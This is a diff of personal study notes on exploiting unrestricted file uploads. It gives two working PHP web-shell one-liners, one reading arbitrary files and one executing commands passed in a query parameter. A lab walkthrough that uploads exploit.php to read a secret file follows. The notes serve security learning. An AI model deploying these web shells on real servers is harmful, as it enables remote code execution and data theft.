@@ -35,7 +35,7 @@ Content-Type: Shows MIME type of file (e.g., text/html, image/png).
 Web shell
 A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.
 
-Exploiting unrestricted file uploads to deploy a web shell:
+# Exploiting unrestricted file uploads to deploy a web shell:
 1. The following PHP one-liner could be used to read arbitrary files from the server's filesystem
 <?php echo file_get_contents('/path/to/target/file'); ?> 
 Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 
@@ -43,3 +43,26 @@ Once uploaded, sending a request for this malicious file will return the target 
 <?php echo system($_GET['command']); ?>
 This script enables you to pass an arbitrary system command via a query parameter as follows:
 GET /example/exploit.php?command=id HTTP/1.1
+
+
+# lab 001
+Remote code execution via web shell upload
+ques: This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. 
+How to proceed
+1. upload a basic PHP web shell
+2. use it to exfiltrate the contents of the file /home/carlos/secret
+How did I do it 
+1. Under HTTP history filter window, Under Filter by MIME type, we enabled the Images checkbox. Upload any random image. 
+2. Image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>
+3. Created exploit.php, containing a script for fetching the contents of Carlos's secret file.
+<?php echo file_get_contents('/home/carlos/secret'); ?> and then uplod it. 
+4. Change the path of the request to point to your PHP file:
+GET /files/avatars/exploit.php HTTP/1.1
+
+
+#  Exploiting Flawed validation of file upload
+
+
+
+
+# lab 002
